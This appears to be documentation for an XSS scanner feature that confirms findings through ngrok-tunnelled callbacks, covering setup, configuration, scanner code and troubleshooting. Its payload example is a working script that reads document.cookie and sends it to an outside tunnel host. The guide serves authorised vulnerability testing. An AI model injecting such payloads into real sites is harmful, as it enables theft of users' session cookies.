# ngrok-Powered Callback Verification Guide

## Overview

This guide covers the ngrok-powered callback verification feature introduced in **PR #110**. This feature enables automatic out-of-band (OOB) verification of XSS vulnerabilities without requiring external callback services.

### What is Callback Verification?

Callback verification is a technique to confirm that injected JavaScript actually executed in the target application by making the payload send an HTTP request back to a controlled endpoint. This provides:

- ✅ **Proof of Exploitation**: Concrete evidence that JavaScript executed
- ✅ **Reduced False Positives**: Only report XSS that's actually exploitable
- ✅ **Bug Bounty Ready**: Evidence suitable for responsible disclosure
- ✅ **Self-Contained**: No external services required with ngrok

### What is ngrok?

[ngrok](https://ngrok.com) is a tool that creates secure tunnels from public URLs to your local machine. In Megido, ngrok is used to:

1. Expose a local callback server to the internet
2. Provide a public HTTPS URL for callback payloads
3. Receive callbacks from target applications during XSS testing

## Prerequisites

### Required Software

- **Python 3.8+**
- **Megido Scanner** (with PR #110 or later)
- **ngrok** (installation instructions below)

### ngrok Account (Recommended)

While ngrok can work without an account, authentication provides:
- No rate limiting
- Better tunnel stability
- Reserved domains (paid plans)
- Multiple simultaneous tunnels

**Sign up for free**: https://dashboard.ngrok.com/signup

## Installation

### Step 1: Install ngrok

#### Linux

```bash
# Download ngrok
curl -s https://ngrok-agent.s3.amazonaws.com/ngrok.asc | \
  sudo tee /etc/apt/trusted.gpg.d/ngrok.asc >/dev/null && \
  echo "deb https://ngrok-agent.s3.amazonaws.com buster main" | \
  sudo tee /etc/apt/sources.list.d/ngrok.list && \
  sudo apt update && sudo apt install ngrok

# Or manual installation
wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz
tar xvzf ngrok-v3-stable-linux-amd64.tgz
sudo mv ngrok /usr/local/bin/
```

#### macOS

```bash
# Using Homebrew
brew install ngrok/ngrok/ngrok

# Or manual installation
wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-darwin-amd64.zip
unzip ngrok-v3-stable-darwin-amd64.zip
sudo mv ngrok /usr/local/bin/
```

#### Windows

1. Download from https://ngrok.com/download
2. Extract `ngrok.exe`
3. Move to `C:\Windows\System32\` or add to PATH

### Step 2: Configure Authentication

#### Get Your Auth Token

1. Sign up or log in to https://dashboard.ngrok.com
2. Navigate to https://dashboard.ngrok.com/get-started/your-authtoken
3. Copy your auth token

#### Set Auth Token

**Method 1: Using ngrok command (Recommended)**

```bash
ngrok config add-authtoken YOUR_AUTH_TOKEN_HERE
```

This stores the token in `~/.config/ngrok/ngrok.yml` and persists across sessions.

**Method 2: Using environment variable**

```bash
# Linux/macOS
export NGROK_AUTH_TOKEN='YOUR_AUTH_TOKEN_HERE'

# Windows PowerShell
$env:NGROK_AUTH_TOKEN='YOUR_AUTH_TOKEN_HERE'

# Windows CMD
set NGROK_AUTH_TOKEN=YOUR_AUTH_TOKEN_HERE
```

**Method 3: In Python code**

```python
config = {
    'enable_callback_verification': True,
    'callback_use_ngrok': True,
    'callback_ngrok_token': 'YOUR_AUTH_TOKEN_HERE',
}
```

### Step 3: Verify Installation

```bash
# Check ngrok version
ngrok version

# Test ngrok tunnel
ngrok http 8888
```

If successful, you should see output like:
```
ngrok                                                                     

Session Status                online
Account                       yourname@email.com
Version                       3.x.x
Region                        United States (us)
Latency                       50ms
Web Interface                 http://127.0.0.1:4040
Forwarding                    https://abc123.ngrok-free.app -> http://localhost:8888

Connections                   ttl     opn     rt1     rt5     p50     p90
                              0       0       0.00    0.00    0.00    0.00
```

Press `Ctrl+C` to stop the test tunnel.

## Usage

### Quick Start Demo

Run the provided demo script:

```bash
python demo_ngrok_scan.py
```

This interactive demo will:
1. Check ngrok installation
2. Start a local callback server
3. Create an ngrok tunnel
4. Display the public callback URL
5. Show example payloads
6. Demonstrate callback verification

### Basic Usage in Scanner

```python
from scanner.callback_manager import CallbackManager

# Initialize callback manager
manager = CallbackManager(port=8888)

# Start server with ngrok
callback_url = manager.start_callback_server(
    use_ngrok=True,
    ngrok_auth_token='YOUR_TOKEN'  # Optional if configured via ngrok CLI
)

print(f"Callback URL: {callback_url}")

# Use callback_url in your XSS payloads
# When payload executes, it will send a request to callback_url

# Check for callbacks
interactions = manager.get_interactions()
for interaction in interactions:
    print(f"Received callback from {interaction['client_ip']}")

# Cleanup
manager.stop_callback_server()
```

### Scanner Configuration

#### Configuration Dictionary

```python
config = {
    # === Callback Verification Settings ===
    
    # Enable callback verification (required)
    'enable_callback_verification': True,
    
    # Use ngrok for tunneling (required for ngrok feature)
    'callback_use_ngrok': True,
    
    # ngrok auth token (optional if configured via CLI)
    'callback_ngrok_token': 'YOUR_NGROK_AUTH_TOKEN',
    
    # Callback server port (default: 8888)
    'callback_port': 8888,
    
    # Timeout for waiting for callbacks (seconds)
    'callback_timeout': 30,
    
    # === Scanner Settings ===
    
    # Enable DOM-based XSS testing
    'enable_dom_testing': True,
    
    # Browser type for testing
    'browser_type': 'chrome',
    
    # Run browser in headless mode
    'headless': True,
}
```

#### Environment Variables

Add to your `.env` file:

```bash
# ngrok authentication
NGROK_AUTH_TOKEN=your_ngrok_token_here

# Callback verification settings
XSS_CALLBACK_VERIFICATION_ENABLED=true
CALLBACK_USE_NGROK=true
CALLBACK_PORT=8888
XSS_CALLBACK_TIMEOUT=30
```

### Complete Scanning Example

```python
#!/usr/bin/env python3
"""Example: XSS scan with ngrok callback verification"""

import os
from scanner.scan_plugins.xss_scanner_plugin import XSSScannerPlugin

# Initialize scanner
scanner = XSSScannerPlugin()

# Configure for ngrok callback verification
config = {
    'enable_callback_verification': True,
    'callback_use_ngrok': True,
    'callback_ngrok_token': os.environ.get('NGROK_AUTH_TOKEN'),
    'callback_timeout': 30,
    'enable_dom_testing': True,
    'browser_type': 'chrome',
    'headless': True,
}

# Scan target
target_url = 'http://example.com/search?q=test'
vulnerability_data = {
    'parameter': 'q',
    'method': 'GET'
}

print(f"Scanning {target_url}...")

result = scanner.execute_attack(
    target_url=target_url,
    vulnerability_data=vulnerability_data,
    config=config
)

# Process results
if result['success']:
    findings = result.get('findings', [])
    print(f"\n✓ Found {len(findings)} VERIFIED XSS vulnerabilities\n")
    
    for i, finding in enumerate(findings, 1):
        print(f"Finding #{i}:")
        print(f"  URL: {finding['url']}")
        print(f"  Parameter: {finding['parameter']}")
        print(f"  Method: {finding['method']}")
        
        if finding.get('callback_verified'):
            interactions = finding.get('callback_interactions', [])
            print(f"  ✓ VERIFIED via callback ({len(interactions)} interactions)")
            
            for j, interaction in enumerate(interactions, 1):
                print(f"    Callback #{j}:")
                print(f"      Time: {interaction['timestamp']}")
                print(f"      IP: {interaction['client_ip']}")
        else:
            print(f"  ✗ Not verified (no callback received)")
        
        print()
else:
    print("\n✗ No verified XSS vulnerabilities found")
    if result.get('error'):
        print(f"Error: {result['error']}")
```

## How It Works

### Architecture

```
┌─────────────────┐
│  Target Web App │
│  (with XSS)     │
└────────┬────────┘
         │
         │ 1. Inject callback payload
         │
    ┌────▼────────────────────────┐
    │  Megido Scanner             │
    │  - Generates XSS payloads   │
    │  - Injects into parameters  │
    └────┬────────────────────────┘
         │
         │ 2. Payload executes in browser
         │
    ┌────▼────────────────────────┐
    │  Target Browser             │
    │  <script>                   │
    │    fetch('callback_url')    │
    │  </script>                  │
    └────┬────────────────────────┘
         │
         │ 3. HTTP request to public URL
         │
    ┌────▼────────────────────────┐
    │  ngrok Tunnel               │
    │  https://abc.ngrok-free.app │
    └────┬────────────────────────┘
         │
         │ 4. Forwards to local server
         │
    ┌────▼────────────────────────┐
    │  Local Callback Server      │
    │  127.0.0.1:8888             │
    └────┬────────────────────────┘
         │
         │ 5. Logs interaction
         │
    ┌────▼────────────────────────┐
    │  Megido Scanner             │
    │  - Verifies callback        │
    │  - Marks XSS as VERIFIED    │
    └─────────────────────────────┘
```

### Callback Payload Example

The scanner generates payloads like:

```html
<script>
(function(){
    var id = 'abc123def456';
    var url = 'https://abc123.ngrok-free.app';
    
    // Try XMLHttpRequest
    try {
        var xhr = new XMLHttpRequest();
        xhr.open('GET', url + '/' + id + '?method=xhr&data=' + 
                 encodeURIComponent(document.cookie), true);
        xhr.send();
    } catch(e) {}
    
    // Try fetch API
    try {
        fetch(url + '/' + id + '?method=fetch&data=' + 
              encodeURIComponent(document.cookie));
    } catch(e) {}
})();
</script>
```

When this executes:
1. Browser makes HTTP request to ngrok URL
2. ngrok forwards to local server
3. Local server logs the interaction
4. Scanner verifies the callback was received
5. XSS is marked as **VERIFIED**

### Verification Process

1. **Generate Payload**: Create unique callback payload with ID
2. **Inject**: Send payload to target parameter
3. **Wait**: Poll for callbacks for up to `callback_timeout` seconds
4. **Verify**: Check if callback with matching ID was received
5. **Report**: Only report XSS as SUCCESS if verified

## Troubleshooting

### ngrok Not Found

**Error**: `ngrok not found` or `ngrok not installed`

**Solution**: 
- Install ngrok following the installation steps above
- Verify installation: `ngrok version`
- Ensure ngrok is in your PATH

### Auth Token Not Configured

**Error**: Tunnel rate limited or unstable

**Solution**:
```bash
# Configure auth token
ngrok config add-authtoken YOUR_TOKEN

# Verify configuration
cat ~/.config/ngrok/ngrok.yml
```

### Port Already in Use

**Error**: `Address already in use` or port binding fails

**Solution**:
```python
# Use a different port
config = {
    'callback_port': 8889,  # Changed from default 8888
    'callback_use_ngrok': True,
}
```

Or find and kill the process using the port:
```bash
# Linux/macOS
lsof -ti:8888 | xargs kill -9

# Windows
netstat -ano | findstr :8888
taskkill /PID <PID> /F
```

### ngrok Tunnel Not Starting

**Error**: `Failed to get ngrok URL` or tunnel timeout

**Solution**:
1. Check ngrok is running: `ps aux | grep ngrok`
2. Test ngrok manually: `ngrok http 8888`
3. Check firewall settings
4. Verify internet connectivity
5. Try different region: `ngrok http 8888 --region eu`

### No Callbacks Received

**Issue**: XSS payload not triggering callbacks

**Debugging**:
1. Open ngrok web interface: http://localhost:4040
2. Check for incoming requests
3. Verify payload executed (browser console)
4. Test callback URL manually in browser
5. Check for CSP (Content Security Policy) blocking
6. Increase timeout: `'callback_timeout': 60`

### Permission Denied

**Error**: `Permission denied` when starting server

**Solution**:
```bash
# Use port > 1024 (no root required)
config = {'callback_port': 8888}

# Or run with sudo (not recommended)
sudo python demo_ngrok_scan.py
```

## Advanced Configuration

### Custom ngrok Options

You can customize ngrok behavior by modifying the callback manager:

```python
from scanner.callback_manager import CallbackManager

manager = CallbackManager(port=8888)

# Start with custom ngrok options
callback_url = manager.start_callback_server(
    use_ngrok=True,
    ngrok_auth_token='YOUR_TOKEN'
)
```

### Multiple Simultaneous Scans

For parallel scanning with multiple ngrok tunnels:

```python
# Scan 1
manager1 = CallbackManager(port=8888)
url1 = manager1.start_callback_server(use_ngrok=True)

# Scan 2
manager2 = CallbackManager(port=8889)
url2 = manager2.start_callback_server(use_ngrok=True)

# Run scans...

# Cleanup
manager1.stop_callback_server()
manager2.stop_callback_server()
```

### ngrok Configuration File

Advanced ngrok settings in `~/.config/ngrok/ngrok.yml`:

```yaml
version: "2"
authtoken: YOUR_AUTH_TOKEN
region: us

tunnels:
  megido:
    proto: http
    addr: 8888
    bind_tls: true
    inspect: true
```

## Security Considerations

### Data Privacy

- ⚠️ **Sensitive Data**: Callbacks may contain cookies, tokens, or other sensitive data
- ⚠️ **ngrok Visibility**: Traffic passes through ngrok infrastructure
- ⚠️ **Logs**: All interactions are logged locally

**Recommendations**:
- Use ngrok only for testing/development
- Don't scan production systems with sensitive data
- Clear logs after testing: `manager.clear_interactions()`
- Consider self-hosted alternatives for sensitive environments

### Rate Limiting

- Free ngrok accounts have connection limits
- Paid plans offer higher limits and reserved domains
- Use auth token to avoid public rate limits

### Network Security

- ngrok creates a public endpoint to your local machine
- Firewall may block ngrok or local server
- Corporate networks may restrict ngrok usage

## Alternatives to ngrok

If ngrok is not suitable, consider:

1. **External Callback Services**:
   ```python
   config = {
       'enable_callback_verification': True,
       'callback_use_ngrok': False,
       'callback_endpoint': 'https://your-webhook.site/...',
   }
   ```

2. **Burp Collaborator** (if available):
   ```python
   config = {
       'enable_callback_verification': True,
       'callback_endpoint': 'https://your-id.burpcollaborator.net',
   }
   ```

3. **Interactsh** (open-source):
   ```bash
   # Self-hosted Interactsh server
   interactsh-server -domain callback.yourdomain.com
   ```

4. **Internal Collaborator** (built-in):
   ```python
   config = {
       'enable_callback_verification': True,
       'use_internal_collaborator': True,
   }
   ```

## Further Reading

- **XSS Callback Verification Guide**: `XSS_CALLBACK_VERIFICATION_GUIDE.md`
- **Callback Manager Source**: `scanner/callback_manager.py`
- **ngrok Documentation**: https://ngrok.com/docs
- **Demo Script**: `demo_ngrok_scan.py`
- **XSS Plugin Guide**: `XSS_PLUGIN_GUIDE.md`

## Support

For issues or questions:
- **GitHub Issues**: https://github.com/tkstanch/Megido/issues
- **Documentation**: Repository documentation files
- **ngrok Support**: https://ngrok.com/docs/support

## Changelog

### PR #110 - Initial Implementation
- Added ngrok integration to CallbackManager
- Implemented automatic tunnel creation
- Added `callback_use_ngrok` configuration option
- Added auth token support
- Created demo script and documentation
